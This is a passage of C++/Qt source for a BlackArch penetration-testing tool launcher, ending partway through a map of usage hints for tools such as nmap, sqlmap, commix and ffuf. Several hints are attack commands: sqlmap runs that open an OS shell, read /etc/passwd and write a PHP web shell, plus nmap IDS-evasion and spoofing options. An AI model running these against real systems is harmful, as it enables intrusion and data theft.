// SPDX-License-Identifier: MIT
#include "backend.h"
#include "desktopparser.h"

#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QStandardPaths>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QProcess>
#include <QUrl>
#include <QDebug>
#include <QDesktopServices>
#include <cstdio>

namespace {

QString homePath() { return QDir::homePath(); }
QString configFile() { return homePath() + "/.config/blackarch-launcher/config.json"; }
QString historyFile() { return homePath() + "/.cache/blackarch-launcher/history.json"; }

QJsonObject defaultConfig() {
    QJsonObject paths;
    paths["backgrounds"]         = homePath() + "/.cache/blackarch-launcher/backgrounds";
    paths["backgrounds_compose"] = homePath() + "/.cache/blackarch-launcher/backgrounds_compose";
    paths["icons"]               = homePath() + "/.local/share/icons/blackarch-tools";
    paths["gif_corner"]          = homePath() + "/.cache/blackarch-launcher/gif_corner";

    QJsonObject roll;
    roll["enabled"] = true;
    roll["interval"] = 5;
    roll["transition_duration"] = 1.5;
    roll["transition_style"] = "slide";
    roll["use_compose"] = true;

    QJsonObject root;
    root["paths"] = paths;
    root["background_roll"] = roll;
    root["terminal"] = "konsole";
    root["container"] = "distrobox enter blackarch --";
    return root;
}

void mergeInto(QJsonObject& dst, const QJsonObject& src) {
    for (auto it = src.begin(); it != src.end(); ++it) {
        if (it->isObject() && dst.value(it.key()).isObject()) {
            auto sub = dst.value(it.key()).toObject();
            mergeInto(sub, it->toObject());
            dst.insert(it.key(), sub);
        } else {
            dst.insert(it.key(), it.value());
        }
    }
}

} // namespace

Backend::Backend(QObject* parent) : QObject(parent) {
    m_tree = new ToolTreeModel(this);

    loadConfig();
    scanCornerFrames();
    m_rickAvatar = homePath() + "/.local/share/icons/blackarch-tools/blackarch-tree-rick-64.png";
    if (!QFile::exists(m_rickAvatar))
        m_rickAvatar = homePath() + "/.local/share/icons/blackarch-tools/blackarch-tree-rick.png";

    // Build the fallback-folder list for QML consumers.
    m_backgroundFolders << m_pathBackgroundsCompose
                        << m_pathBackgrounds
                        << homePath() + "/.local/share/blackarch-launcher/fallback/";

    // Watch background directories so new images are picked up live.
    m_watcher = new QFileSystemWatcher(this);
    if (QDir(m_pathBackgrounds).exists())
        m_watcher->addPath(m_pathBackgrounds);
    if (QDir(m_pathBackgroundsCompose).exists())
        m_watcher->addPath(m_pathBackgroundsCompose);
    connect(m_watcher, &QFileSystemWatcher::directoryChanged, this, &Backend::rescanBackgrounds);

    scanBackgrounds();
    scanTools();

    QFile hf(historyFile());
    if (hf.open(QIODevice::ReadOnly)) {
        const auto doc = QJsonDocument::fromJson(hf.readAll());
        for (const auto& v : doc.array()) m_history.append(v.toString());
    }

    m_containerTimer.setInterval(8000);
    connect(&m_containerTimer, &QTimer::timeout, this, &Backend::pollContainer);
    m_containerTimer.start();
    QTimer::singleShot(50, this, &Backend::pollContainer);
}

void Backend::loadConfig() {
    auto cfg = defaultConfig();

    QFile f(configFile());
    if (f.open(QIODevice::ReadOnly)) {
        const auto user = QJsonDocument::fromJson(f.readAll()).object();
        mergeInto(cfg, user);
    }

    const auto paths = cfg.value("paths").toObject();
    m_pathBackgrounds        = paths.value("backgrounds").toString();
    m_pathBackgroundsCompose = paths.value("backgrounds_compose").toString();
    m_pathIcons              = paths.value("icons").toString();
    m_pathGifCorner          = paths.value("gif_corner").toString();

    const auto roll = cfg.value("background_roll").toObject();
    m_rollEnabled        = roll.value("enabled").toBool(true);
    m_rollIntervalMs     = int(roll.value("interval").toDouble(5) * 1000);
    m_rollDurationMs     = int(roll.value("transition_duration").toDouble(1.5) * 1000);
    m_transitionStyle    = roll.value("transition_style").toString("slide");
    m_useCompose         = roll.value("use_compose").toBool(true);

    m_terminalCmd  = cfg.value("terminal").toString("konsole");
    m_containerCmd = cfg.value("container").toString("distrobox enter blackarch --");

    emit configChanged();
}

void Backend::saveConfig() {
    QJsonObject root = defaultConfig();
    QJsonObject roll = root.value("background_roll").toObject();
    roll["enabled"] = m_rollEnabled;
    roll["interval"] = m_rollIntervalMs / 1000.0;
    roll["transition_duration"] = m_rollDurationMs / 1000.0;
    roll["transition_style"] = m_transitionStyle;
    roll["use_compose"] = m_useCompose;
    root["background_roll"] = roll;
    root["terminal"] = m_terminalCmd;
    root["container"] = m_containerCmd;

    QDir().mkpath(QFileInfo(configFile()).absolutePath());
    QFile f(configFile());
    if (f.open(QIODevice::WriteOnly | QIODevice::Truncate))
        f.write(QJsonDocument(root).toJson(QJsonDocument::Indented));
}

void Backend::scanBackgrounds() {
    QStringList found;
    auto pickFrom = [&](const QString& dir, const QStringList& patterns) {
        QDir d(dir);
        if (!d.exists()) return false;
        const auto files = d.entryInfoList(patterns, QDir::Files, QDir::Name);
        for (const auto& fi : files) found.append(QUrl::fromLocalFile(fi.absoluteFilePath()).toString());
        return !found.isEmpty();
    };

    // Tier 1: composited wallpapers (glass-panel baked in).
    if (m_useCompose)
        pickFrom(m_pathBackgroundsCompose, {"*-full.png"});

    // Tier 2: user-supplied original wallpapers.
    if (found.isEmpty())
        pickFrom(m_pathBackgrounds, {"*.png", "*.jpg", "*.jpeg"});

    // Tier 3: built-in fallback images shipped with the launcher.
    if (found.isEmpty())
        pickFrom(homePath() + "/.local/share/blackarch-launcher/fallback", {"*.png", "*.jpg", "*.jpeg"});

    bool wasFallback = m_fallbackActive;
    m_fallbackActive = found.isEmpty();

    if (m_backgrounds != found || wasFallback != m_fallbackActive) {
        m_backgrounds = found;
        emit backgroundsChanged();
    }
}

void Backend::rescanBackgrounds() {
    scanBackgrounds();
}

void Backend::selectTool(int entryIndex) {
    if (!m_tree) return;
    const auto& entries = m_tree->entries();
    if (entryIndex < 0 || entryIndex >= entries.size()) return;
    const auto& e = entries.at(entryIndex);

    QVariantMap m;
    m["name"] = e.name;
    m["generic"] = e.genericName;
    m["comment"] = e.comment;
    m["exec"] = e.exec;
    m["entryIndex"] = entryIndex;
    m["terminal"] = e.terminal;

    // Determine terminal from X-BlackArch categories.
    bool isTerm = e.terminal;
    if (e.categories.contains("X-BlackArch-GUI")) isTerm = false;
    if (e.categories.contains("X-BlackArch-CLI")) isTerm = true;
    m["isTerminal"] = isTerm;

    // Icon: check .desktop path, then fallback dirs.
    QString iconPath;
    if (!e.icon.isEmpty() && QFileInfo::exists(e.icon))
        iconPath = e.icon;
    else {
        const QString iconsDir = homePath() + "/.local/share/icons/blackarch-tools/";
        for (const auto& ext : {".svg", ".png"}) {
            const auto p = iconsDir + e.name + ext;
            if (QFileInfo::exists(p)) { iconPath = p; break; }
        }
    }
    if (!iconPath.isEmpty())
        m["iconUrl"] = QUrl::fromLocalFile(iconPath).toString();

    // Tag category.
    for (const auto& c : e.categories) {
        if (c.startsWith("X-BlackArch-") && !c.endsWith("CLI") && !c.endsWith("GUI")) {
            QString tag = c.mid(12); // after "X-BlackArch-"
            m["tag"] = tag;
            // Color per category.
            static const QHash<QString, QString> colors = {
                {"Recon","#5b8def"},{"Web","#7a4eb8"},{"Exploit","#d9534f"},
                {"Cred","#f5b041"},{"Reverse","#3da556"},{"Pwn","#ec7063"},
                {"Forensic","#16a085"},{"Mobile","#9b6dff"},{"Traffic","#1abc9c"},
                {"Crypto","#a87c50"}
            };
            m["tagColor"] = colors.value(tag, "#888888");
            break;
        }
    }

    m_selectedTool = m;

    m_selectedToolName = e.name;
    m_selectedToolGeneric = e.genericName;
    m_selectedToolComment = e.comment;
    m_selectedToolExec = e.exec;
    m_selectedToolEntryIndex = entryIndex;
    m_selectedToolIsTerminal = isTerm;
    m_selectedToolIconUrl = m.value("iconUrl").toString();
    m_selectedToolTag = m.value("tag").toString();
    m_selectedToolTagColor = m.value("tagColor").toString();

    emit toolSelected();
}

void Backend::scanCornerFrames() {
    QDir d(m_pathGifCorner);
    if (!d.exists()) return;
    const auto files = d.entryInfoList({"frame-*.png"}, QDir::Files, QDir::Name);
    for (const auto& fi : files)
        m_cornerFrames.append(QUrl::fromLocalFile(fi.absoluteFilePath()).toString());
}

void Backend::scanTools() {
    const QStringList dirs = {
        homePath() + "/.local/share/applications",
        homePath() + "/.local/share/applications/blackarch",
    };
    auto entries = DesktopParser::parseDirectories(dirs);

    QList<DesktopEntry> kept;
    for (const auto& e : entries) {
        bool hit = false;
        for (const auto& c : e.categories) if (c.startsWith("X-BlackArch")) { hit = true; break; }
        if (!hit) for (const auto& k : e.keywords) if (k.compare("blackarch", Qt::CaseInsensitive) == 0) { hit = true; break; }
        if (!hit && e.exec.contains("blackarch", Qt::CaseInsensitive)) hit = true;
        if (hit) kept.append(e);
    }
    m_tree->setEntries(std::move(kept));
    emit toolsChanged();
}

void Backend::launchEntry(int entryIndex) {
    if (!m_tree) return;
    const auto& entries = m_tree->entries();
    if (entryIndex < 0 || entryIndex >= entries.size()) return;
    const auto& e = entries.at(entryIndex);
    const auto cmd = DesktopParser::cleanExec(e.exec);
    const QStringList args = {"-c", cmd};
    if (!QProcess::startDetached("/bin/sh", args)) {
        emit error(QString("启动失败：%1\n命令：%2").arg(e.name, cmd));
    } else {
        recordHistory(e.name);
    }
}

void Backend::openDesktopEntry(int entryIndex) {
    if (!m_tree) return;
    const auto& entries = m_tree->entries();
    if (entryIndex < 0 || entryIndex >= entries.size()) return;
    QDesktopServices::openUrl(QUrl::fromLocalFile(entries.at(entryIndex).path));
}

void Backend::recordHistory(const QString& name) {
    m_history.removeAll(name);
    m_history.prepend(name);
    if (m_history.size() > 50) m_history = m_history.mid(0, 50);

    QDir().mkpath(QFileInfo(historyFile()).absolutePath());
    QFile f(historyFile());
    if (f.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        QJsonArray arr;
        for (const auto& n : m_history) arr.append(n);
        f.write(QJsonDocument(arr).toJson(QJsonDocument::Compact));
    }
}

void Backend::refresh() {
    loadConfig();

    // Rebuild the watched directory set from current config.
    const QStringList dirs = { m_pathBackgrounds, m_pathBackgroundsCompose };
    if (m_watcher) {
        const auto watching = m_watcher->directories();
        for (const auto& d : watching) m_watcher->removePath(d);
        for (const auto& d : dirs) {
            if (QDir(d).exists()) m_watcher->addPath(d);
        }
    }
    m_backgroundFolders = { m_pathBackgroundsCompose, m_pathBackgrounds,
                            homePath() + "/.local/share/blackarch-launcher/fallback/" };

    scanBackgrounds();
    scanTools();
}

void Backend::pollContainer() {
    QProcess p;
    p.setProcessChannelMode(QProcess::MergedChannels);
    p.start("distrobox", {"list"});
    if (!p.waitForStarted(1500) || !p.waitForFinished(2500)) {
        m_containerStatus = "未知";
        m_containerStatusColor = "#888888";
        emit containerStatusChanged();
        return;
    }
    const auto out = QString::fromUtf8(p.readAll());
    QString status = "未启动";
    QString color = "#f5b041";
    for (const auto& line : out.split('\n')) {
        if (!line.contains("blackarch", Qt::CaseInsensitive)) continue;
        if (line.contains("Up", Qt::CaseSensitive) || line.contains("running", Qt::CaseInsensitive)) {
            status = "已运行";
            color = "#3da556";
        } else if (line.contains("Exited", Qt::CaseInsensitive)) {
            status = "Exited";
            color = "#f5b041";
        }
        break;
    }
    if (status != m_containerStatus) {
        m_containerStatus = status;
        m_containerStatusColor = color;
        emit containerStatusChanged();
    }
}

void Backend::setRollIntervalMs(int v) { if (v != m_rollIntervalMs) { m_rollIntervalMs = v; emit configChanged(); } }
void Backend::setRollDurationMs(int v) { if (v != m_rollDurationMs) { m_rollDurationMs = v; emit configChanged(); } }
void Backend::setTransitionStyle(const QString& s) { if (s != m_transitionStyle) { m_transitionStyle = s; emit configChanged(); } }
void Backend::setRollEnabled(bool e) { if (e != m_rollEnabled) { m_rollEnabled = e; emit configChanged(); } }

void Backend::setQuery(const QString& q) {
    if (q == m_query) return;
    m_query = q;
    if (m_tree) m_tree->setQueryFilter(q);
    emit queryChanged();
}

void Backend::debugLog(const QString& msg) {
    QFile df("/tmp/ba-debug.log");
    if (df.open(QIODevice::WriteOnly | QIODevice::Append)) {
        df.write(msg.toUtf8() + "\n");
        df.close();
    }
}

// ── usage hints ─────────────────────────────────────────────────────────────
// One- to three-line usage examples for the common BlackArch tools.  Static,
// instant.  When the tool isn't in the map we fall back to a generic prompt.
// Keys are matched case-insensitively (and "gui-" / "ba-" prefixes stripped).

QString Backend::usageFor(const QString& name) const {
    QString key = name.trimmed().toLower();
    if (key.startsWith("ba-"))   key = key.mid(3);
    if (key.startsWith("gui-"))  key = key.mid(4);

    static const QHash<QString, QString> kHints = {
        // ═══════════════════════════════════════════════════════════════
        // recon — 信息收集
        // ═══════════════════════════════════════════════════════════════
        {"nmap",
            "# === 目标指定 ===\n"
            "nmap 192.168.1.1                         # 扫描单个 IP\n"
            "nmap 192.168.1.1-100                     # 扫描 IP 范围\n"
            "nmap 192.168.1.0/24                      # 扫描整个 C 段\n"
            "nmap -iL targets.txt                     # 从文件读取目标\n"
            "nmap -iR 100                             # 随机扫描 100 个主机\n"
            "nmap --exclude 192.168.1.5 192.168.1.0/24 # 排除特定主机\n"
            "\n# === 主机发现（Ping 类型）===\n"
            "nmap -sn 192.168.1.0/24                  # 仅存活扫描（ping sweep）\n"
            "nmap -Pn 192.168.1.1                     # 跳过主机发现，假设在线\n"
            "nmap -PE 192.168.1.1                     # ICMP Echo 请求\n"
            "nmap -PS80,443 192.168.1.1               # TCP SYN Ping\n"
            "nmap -PA80,443 192.168.1.1               # TCP ACK Ping\n"
            "nmap -PU53,161 192.168.1.1               # UDP Ping\n"
            "nmap -PR 192.168.1.0/24                  # ARP Ping（局域网）\n"
            "\n# === 扫描技术 ===\n"
            "nmap -sS 192.168.1.1                     # TCP SYN 半开扫描（默认，快且隐蔽）\n"
            "nmap -sT 192.168.1.1                     # TCP Connect 全连接扫描（无需 root）\n"
            "nmap -sU 192.168.1.1                     # UDP 扫描（慢，但重要服务用 UDP）\n"
            "nmap -sA 192.168.1.1                     # TCP ACK 扫描（探测防火墙规则）\n"
            "nmap -sW 192.168.1.1                     # TCP Window 扫描\n"
            "nmap -sF 192.168.1.1                     # FIN 扫描（绕过部分防火墙）\n"
            "nmap -sX 192.168.1.1                     # Xmas 扫描（FIN+URG+PSH）\n"
            "nmap -sI 僵尸IP 目标IP                    # Idle 扫描（完全隐身，通过僵尸机）\n"
            "\n# === 端口指定 ===\n"
            "nmap -p 22,80,443 192.168.1.1            # 指定端口\n"
            "nmap -p 1-1000 192.168.1.1               # 端口范围\n"
            "nmap -p- 192.168.1.1                     # 全部 65535 端口\n"
            "nmap -F 192.168.1.1                      # 快速扫描（top 100 端口）\n"
            "nmap --top-ports 1000 192.168.1.1        # 最常用的 1000 端口\n"
            "nmap -p U:53,161,T:22,80 192.168.1.1    # 混合 TCP/UDP 指定\n"
            "nmap --open 192.168.1.1                  # 仅显示开放端口\n"
            "\n# === 服务/版本检测 ===\n"
            "nmap -sV 192.168.1.1                     # 基本版本检测\n"
            "nmap -sV --version-intensity 9 192.168.1.1  # 激进版本检测\n"
            "nmap -sV --version-all 192.168.1.1       # 尝试所有探针\n"
            "\n# === 操作系统检测 ===\n"
            "nmap -O 192.168.1.1                      # OS 指纹识别\n"
            "nmap -O --osscan-guess 192.168.1.1       # 激进 OS 猜测\n"
            "nmap -O --osscan-limit 192.168.1.1       # 仅对可能目标进行 OS 检测\n"
            "\n# === 激进扫描（一键全开）===\n"
            "nmap -A 192.168.1.1                      # = -O -sV -sC --traceroute\n"
            "nmap -sS -sV -O -A -p- -T4 192.168.1.1 -oA full_scan  # 综合一体命令\n"
            "\n# === NSE 脚本引擎 ===\n"
            "nmap -sC 192.168.1.1                     # 默认安全脚本\n"
            "nmap --script vuln 192.168.1.1           # 漏洞检测脚本\n"
            "nmap --script 'smb-vuln*' -p 445 192.168.1.1  # SMB 漏洞扫描\n"
            "nmap --script http-enum,http-headers 192.168.1.1  # Web 枚举\n"
            "nmap --script ftp-anon,ssh-brute,mysql-info 192.168.1.1  # 多脚本组合\n"
            "\n# === 速度/性能 ===\n"
            "nmap -T0 192.168.1.1    # 偏执（IDS 规避，5分钟间隔）\n"
            "nmap -T3 192.168.1.1    # 正常（默认）\n"
            "nmap -T4 192.168.1.1    # 激进（快速可靠网络）\n"
            "nmap -T5 192.168.1.1    # 疯狂（仅本地网络）\n"
            "nmap --min-rate 1000 --max-rate 5000 192.168.1.1  # 速率控制\n"
            "nmap --scan-delay 3s 192.168.1.1        # 探测间隔（避开 IDS）\n"
            "nmap --max-retries 2 192.168.1.1        # 最大重试次数\n"
            "nmap --host-timeout 30s 192.168.1.0/24  # 跳过慢速主机\n"
            "\n# === 防火墙/IDS 规避 ===\n"
            "nmap -f 192.168.1.1                     # 分片包发送\n"
            "nmap --mtu 16 192.168.1.1               # 自定义 MTU 大小\n"
            "nmap -D RND:10 192.168.1.1              # 诱饵扫描（10个随机假IP）\n"
            "nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.1  # 指定诱饵 IP\n"
            "nmap -S 伪造IP -e eth0 192.168.1.1       # IP 欺骗\n"
            "nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1  # MAC 欺骗\n"
            "nmap --source-port 53 192.168.1.1       # 伪造源端口（如 DNS 53）\n"
            "nmap --data-length 50 192.168.1.1       # 附加随机数据（规避签名检测）\n"
            "\n# === 输出格式 ===\n"
            "nmap -oN output.txt 192.168.1.1          # 普通文本输出\n"
            "nmap -oX output.xml 192.168.1.1          # XML 输出\n"
            "nmap -oG output.gnmap 192.168.1.1        # Grepable 输出\n"
            "nmap -oA scan_result 192.168.1.1         # 所有格式（.nmap/.xml/.gnmap）\n"
            "nmap -v 192.168.1.1                      # 详细输出\n"
            "nmap -vv 192.168.1.1                     # 更详细输出\n"
            "nmap -n 192.168.1.1                      # 不进行 DNS 解析\n"
            "nmap -R 192.168.1.1                      # 始终进行 DNS 反向解析\n"
            "nmap --traceroute 192.168.1.1            # 追踪路由路径\n"
            "nmap -6 IPv6地址                         # IPv6 扫描"},

        {"masscan",
            "# 极速端口扫描（像 nmap 但快 100 倍，适合 Internet 级扫描）\n"
            "masscan 10.0.0.0/8 -p80,443,22,3389 --rate=10000           # 全网段常见端口\n"
            "masscan -iL targets.txt -p0-65535 --rate=5000               # 全端口 + 文件输入\n"
            "masscan 192.168.1.0/24 -p80,443 -oJ masscan.json --rate=3000  # JSON 输出\n"
            "masscan 10.0.0.0/8 -p80 --banners --source-ip 10.0.0.100   # 抓取 Banner\n"
            "masscan -p80,443 10.0.0.0/8 --rate=100000 --shard 1/4      # 分片：1/4 地址空间\n"
            "# 配合 nmap 使用：masscan 快速发现端口 → nmap 详细信息\n"
            "masscan 192.168.1.0/24 -p1-65535 --rate=10000 | awk '{print $NF}' | sort -u > ports.txt"},

        {"rustscan",
            "# Rust 端口扫描器，3 秒扫完全端口，自动联动 nmap\n"
            "rustscan -a 192.168.1.1 -- -sV -sC                        # 单目标 + nmap 参数\n"
            "rustscan -a 192.168.1.0/24 -p 1-65535 --ulimit 5000 -- -A  # 全端口 + 激进\n"
            "rustscan -a 10.0.0.5 -p 22,80,443,8080,8443 -- -sV        # 指定端口\n"
            "rustscan -a targets.txt --range 1-10000 -b 2000 -- -sC     # 批量目标 + 限速\n"
            "rustscan -a 192.168.1.1 --scripts -- -A -oN scan.txt      # 全脚本 + 输出"},

        {"naabu",
            "# ProjectDiscovery 端口扫描器，基于 SYN 半开\n"
            "naabu -host example.com -p - -rate 1000                    # 全端口扫描\n"
            "naabu -host 10.0.0.0/24 -p 1-1000 -silent                  # CIDR 网段\n"
            "naabu -list targets.txt -p 22,80,443,8080 -o ports.txt     # 批量目标\n"
            "naabu -host example.com -c 100 -rate 2000                  # 并发 100"},

        {"amass",
            "# OWASP 子域名枚举（被动+主动+暴力）\n"
            "amass enum -d example.com -o amass.txt                    # 基本枚举\n"
            "amass enum -brute -d example.com -src                      # 枚举 + 暴力 + 源数据\n"
            "amass intel -org 'Example Corp'                            # 组织资产发现\n"
            "amass enum -d example.com -config config.ini              # 使用配置文件（含 API 密钥）\n"
            "amass viz -d example.com -d3                               # D3 可视化\n"
            "amass track -d example.com -last 2                         # 跟踪域名变化（对比上次扫描）\n"
            "amass db -d example.com -show                              # 显示已收集的数据"},

        {"subfinder",
            "# 被动子域名发现（快速，无主动扫描）\n"
            "subfinder -d example.com -all -silent                      # 全部数据源\n"
            "subfinder -dL domains.txt -o subs.txt                      # 批量域名\n"
            "subfinder -d example.com -nW -o resolved.txt               # 仅解析结果\n"
            "subfinder -d example.com -json -o subs.json                # JSON 输出\n"
            "subfinder -d example.com -timeout 5 -max-time 15           # 超时控制"},

        {"assetfinder",
            "# 查找与域名关联的子域名和 IP 块（使用外部 API）\n"
            "assetfinder --subs-only example.com                        # 仅子域名\n"
            "assetfinder example.com | tee assets.txt                   # 全量输出\n"
            "assetfinder example.com | httpx -silent                    # 联动 httpx 验证 Web 服务"},

        {"findomain",
            "# 跨平台子域名枚举（Rust 实现）\n"
            "findomain -t example.com                                   # 单目标\n"
            "findomain -f targets.txt -o output.txt                     # 批量 + 输出\n"
            "findomain -t example.com --http-status                     # 检查 HTTP 状态码\n"
            "findomain -t example.com -m en masse                       # 仅被动模式"},

        {"theharvester",
            "# 邮箱、子域名、IP、姓名收集（OSINT）\n"
            "theHarvester -d example.com -b google,bing,shodan,censys   # 指定数据源\n"
            "theHarvester -d example.com -b all -f report.html          # 所有数据源\n"
            "theHarvester -d example.com -l 500 -b linkedin             # 限制结果数\n"
            "theHarvester -d example.com -b google -s 100               # 从第 100 条开始"},

        {"spiderfoot",
            "# 自动化 OSINT 扫描器（Web GUI 或 CLI）\n"
            "spiderfoot -l 127.0.0.1:5001    # Web 界面 http://127.0.0.1:5001\n"
            "spiderfoot -s example.com -t all -o csv -q                # 命令行全扫描\n"
            "spiderfoot -s example.com -t EMAIL,DOMAIN -o json         # 指定模块\n"
            "spiderfoot -m sfp_spider -s example.com                   # 仅运行特定模块"},

        {"dnsrecon",
            "# DNS 枚举与信息收集\n"
            "dnsrecon -d example.com -t std,brt                        # 标准 + 字典爆破\n"
            "dnsrecon -d example.com -t axfr                           # 区域传送（AXFR）尝试\n"
            "dnsrecon -d example.com -t axfr -r 10.0.0.0/24            # 反向解析范围\n"
            "dnsrecon -d example.com -t snoop -n 8.8.8.8               # DNS 缓存探测\n"
            "dnsrecon -d example.com -t zonewalk                       # DNSSEC NSEC 遍历"},

        {"dnsx",
            "# DNS 工具链（批量解析）\n"
            "dnsx -d example.com -resp -a -aaaa -cname -mx -ns -txt    # 全部记录类型\n"
            "dnsx -l subs.txt -resp-only -silent                       # 批量解析 + 安静模式\n"
            "dnsx -d example.com -cdn -asn -ip                         # CDN/ASN 信息\n"
            "dnsx -l subs.txt -json -o dns.json                        # JSON 输出"},

        {"httpx",
            "# HTTP 探针（检测 Web 服务存活 + 指纹）\n"
            "httpx -l hosts.txt -title -tech-detect -status-code -ip   # 基本信息\n"
            "httpx -l subs.txt -screenshot -ss-screenshot-dir screens/ # 网页截图\n"
            "httpx -l hosts.txt -cdn -waf -mc 200,301,403              # CDN/WAF 检测 + 状态码过滤\n"
            "httpx -l hosts.txt -json -o web.json                      # JSON 输出\n"
            "httpx -l hosts.txt -path /admin -path /.git               # 探测特定路径\n"
            "httpx -l hosts.txt -probe -t 100                          # 并发 100"},

        // ═══════════════════════════════════════════════════════════════
        // web
        // ═══════════════════════════════════════════════════════════════
        {"ffuf",
            "# 超快 Web Fuzzer（Go 实现）\n"
            "ffuf -u https://target/FUZZ -w wordlist.txt -mc 200,301,403  # 目录爆破\n"
            "ffuf -u 'https://target/?id=FUZZ' -w nums.txt -fs 0          # GET 参数 Fuzz\n"
            "ffuf -u https://target/login -w dict.txt -X POST \\             # POST + Cookie\n"
            "    -d 'user=FUZZ&pass=admin' -b 'SESSION=xxx'\n"
            "ffuf -u https://target/FUZZ -w dict.txt -recursion -recursion-depth 2  # 递归\n"
            "ffuf -u https://target/FUZZ -w dict.txt -H 'X-Forwarded-For: FUZZ'  # Header Fuzz\n"
            "ffuf -u https://target -w subdomains.txt -H 'Host: FUZZ.target' \\\n"
            "    -fc 404                                        # VHOST 发现\n"
            "ffuf -w words.txt -u https://FUZZ.target -mc 200   # 子域名 Fuzz"},

        {"feroxbuster",
            "# Rust 目录爆破器（递归+快）\n"
            "feroxbuster -u https://target -w common.txt -x php,html,txt   # 基本扫描\n"
            "feroxbuster -u https://target -w raft-large.txt -t 100 -d 5   # 深度递归\n"
            "feroxbuster -u https://target -w dict.txt -r \\                # 跟踪 302 跳转 + 过滤\n"
            "    --filter-status 400,401,404,500\n"
            "feroxbuster -u https://target --insecure --proxy http://127.0.0.1:8080  # 代理"},

        {"gobuster",
            "# Go 目录/DNS/VHOST 枚举器\n"
            "gobuster dir -u https://target -w wordlist.txt -x php,html,asp  # 目录模式\n"
            "gobuster dns -d example.com -w subs.txt -t 100                  # DNS 模式\n"
            "gobuster vhost -u https://target -w vhosts.txt --append-domain   # VHOST 模式\n"
            "gobuster dir -u https://target -w dict.txt -k --delay 100ms      # 忽略证书 + 延迟\n"
            "gobuster s3 -w buckets.txt                                       # S3 Bucket 发现"},

        {"wfuzz",
            "# 经典 Web Fuzzer（Python）\n"
            "wfuzz -c -z file,wordlist.txt --hc 404 https://target/FUZZ      # 目录 Fuzz\n"
            "wfuzz -c -z file,post.txt -d 'user=FUZZ&pass=FUZZ' --hl 123 \\   # POST + 隐藏长度\n"
            "    https://target/login\n"
            "wfuzz -c -z list,admin-user-test -z file,pass.txt --sc 200 \\     # 多 Payload\n"
            "    -d 'username=FUZZ&password=FUZ2Z' https://target/login\n"
            "wfuzz -c -z range,0-9999 -H 'X-ID: FUZZ' https://target/api     # 数字遍历 + Header\n"
            "wfuzz -c -z file,params.txt --hh 1234 -X POST https://target/api # 隐藏响应长度过滤"},

        {"sqlmap",
            "# 自动化 SQL 注入（Python，功能最全）\n"
            "# === 基本检测 ===\n"
            "sqlmap -u 'https://target/page?id=1' --batch --dbs              # 获取数据库列表\n"
            "sqlmap -u 'https://target/page?id=1' --current-db                # 当前数据库\n"
            "sqlmap -u 'https://target/page?id=1' -D db -T users --dump      # 导出表数据\n"
            "# === 从文件注入（推荐，保存 HTTP 请求原文）===\n"
            "sqlmap -r request.txt --level 5 --risk 3 --dbms mysql           # Burp 请求文件\n"
            "# === 注入技术选择 ===\n"
            "sqlmap -u URL --technique=BEUSTQ                                # 全部技术\n"
            "sqlmap -u URL --technique=E                                     # 仅报错注入\n"
            "sqlmap -u URL --technique=B --fresh-queries                    # 仅布尔盲注\n"
            "# === 绕过 WAF/IDS ===\n"
            "sqlmap -u URL --tamper=space2comment,randomcase,charencode      # Tamper 脚本\n"
            "sqlmap -u URL --random-agent --delay=5                          # 随机 UA + 延迟\n"
            "sqlmap -u URL --proxy='http://127.0.0.1:8080'                   # 通过 Burp 代理\n"
            "sqlmap -u URL --level=5 --risk=3                                # 深度扫描 + 高风险\n"
            "# === 文件/系统操作（需要 DBA 权限）===\n"
            "sqlmap -u URL --os-shell                                        # 系统 Shell\n"
            "sqlmap -u URL --file-read='/etc/passwd'                         # 读取文件\n"
            "sqlmap -u URL --file-write=shell.php --file-dest=/var/www/shell.php  # 写入文件\n"
            "# === 高级枚举 ===\n"
            "sqlmap -u URL --is-dba --privileges                             # 检查 DBA + 权限\n"
            "sqlmap -u URL --users --passwords                               # 枚举用户密码哈希\n"
            "sqlmap -u URL --search -C name,email -T users                   # 搜索特定列\n"
            "sqlmap -u URL --sql-query 'SELECT @@version'                   # 自定义 SQL\n"
            "# === POST/JSON/Cookie 注入 ===\n"
            "sqlmap -u URL --data='user=admin&pass=test' --level 2          # POST 注入\n"
            "sqlmap -u URL --cookie='PHPSESSID=xxx' --level 2               # Cookie 注入\n"
            "sqlmap -r request.txt --csrf-token='token_name'                # CSRF Token 处理"},

        {"commix",
            "# 命令注入自动化利用\n"
            "commix -u 'https://target/page?cmd=ls' --batch                 # GET 参数注入\n"
            "commix -r request.txt --os-cmd='id'                            # 从文件 + 执行命令\n"
            "commix -u URL --data='ip=127.0.0.1' --technique=c              # POST + 经典注入\n"
            "commix -u URL --os-shell                                        # 交互式 Shell"},

        {"xsstrike",
            "# XSS 检测与利用（Python）\n"
            "xsstrike -u 'https://target/search?q=test' --crawl             # 基本扫描\n"
            "xsstrike -u 'https://target/?p=1' -l 3 --delay 2              # 深度扫描 + 延迟\n"
            "xsstrike -u URL --headers                                       # 检测 Header 注入\n"
            "xsstrike -u URL --blind                                         # 盲 XSS 检测\n"
            "xsstrike -u URL -f params.txt                                   # 多参数 Fuzz"},

        {"dalfox",
            "# Go 快速 XSS 扫描器\n"
            "dalfox url 'https://target/?q=test' --skip-bav                 # 单 URL\n"
            "dalfox file urls.txt -o result.txt                              # 批量扫描\n"
            "dalfox url 'https://target/?q=test' --delay 2 -w 10            # 延迟 + Worker\n"
            "dalfox url URL --cookie 'PHPSESSID=xxx' --header 'Auth: Bearer xxx'  # 认证"},

        {"nikto",
            "# Web 服务器漏洞扫描（Perl）\n"
            "nikto -h https://target -ssl                                    # HTTPS 扫描\n"
            "nikto -h https://target -p 8443 -o report.html -Format html     # 指定端口 + HTML 报告\n"
            "nikto -h https://target -Tuning 1234567890                      # 全部测试\n"
            "nikto -h https://target -Tuning x 6                             # 仅 SQL 注入 + 文件上传\n"
            "nikto -h https://target -useragent 'Mozilla/5.0'                # 自定义 UA"},

        {"wpscan",
            "# WordPress 安全扫描\n"
            "wpscan --url https://target --enumerate u,vp,cb,dbe,t           # 全面枚举\n"
            "wpscan --url https://target -U users.txt -P pass.txt            # 用户爆破\n"
            "wpscan --url https://target --enumerate vp --api-token TOKEN    # 漏洞插件（需要 API Token）\n"
            "wpscan --url https://target --enumerate u --passwords pass.txt  # 用户发现 + 密码测试"},

        {"whatweb",
            "# Web 技术栈识别（Ruby）\n"
            "whatweb -a 3 https://target                                    # 激进模式\n"
